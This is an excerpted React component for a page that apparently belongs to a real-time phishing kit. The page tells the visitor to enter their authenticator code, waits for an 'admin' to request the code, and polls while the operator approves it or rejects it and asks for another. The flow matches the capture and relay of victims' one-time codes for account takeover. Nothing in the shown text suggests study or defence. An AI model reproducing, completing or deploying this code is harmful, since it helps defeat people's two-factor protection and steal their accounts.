...
/**
 * 2FA/Authenticator Verification Page
 * - Awaits admin command to request 2FA code
...
export default function Verification() {
  ...
  useEffect(() => {
    ...
    const newStatus = getSessionQuery.data.status || "pending";
    console.log("[Verification] Session status:", newStatus, "lastSeenStatus:", lastSeenStatus);

    // If code was rejected (transitioned from submitted back to requested), show error message
    if (newStatus === "auth_code_requested" && lastSeenStatus === "auth_code_submitted") {
      console.log("[Verification] Code was rejected!");
      setIsWaitingForApproval(false);
      setCode(["", "", "", "", "", ""]);
      setShowRejectionError(true);
      setTimeout(() => setShowRejectionError(false), 3000);
    }
    // If code was approved, redirect to dashboard
    else if (newStatus === "verified") {
      console.log("[Verification] Redirecting to /dashboard");
  ...
  // Submit 2FA code mutation
  const submitCodeMutation = trpc.clientData.submitAuthCode.useMutation({
    onSuccess: () => {
      ...
      <main className="pt-20 md:pt-24 px-4 md:px-8 pb-8 md:pb-0 min-h-screen flex items-center">
        <div className="max-w-7xl mx-auto w-full grid grid-cols-1 md:grid-cols-2 gap-8 md:gap-20 items-center">
          ...
          <div className="space-y-6 md:space-y-8 order-1 md:order-2">
            <div>
              <h1 className="text-3xl md:text-5xl font-bold mb-2 tracking-tight">2FA Verification</h1>
              <p className="text-white/60">Enter your 6-digit authenticator code</p>
            </div>

            {/* Status Message */}
            <div className={`p-4 rounded-lg border ${
              sessionStatus === "auth_code_requested" 
              ...
              {sessionStatus === "auth_code_requested" && (
                <p className="text-green-400">✓ Admin requested 2FA code</p>
              )}
              {sessionStatus === "auth_code_submitted" && (
            ...
            {showRejectionError && (
              <div className="p-4 rounded-lg bg-red-500/10 border border-red-500/30">
                <p className="text-red-400">✗ Código 2FA rejeitado! Digite novamente.</p>
              </div>
            )}
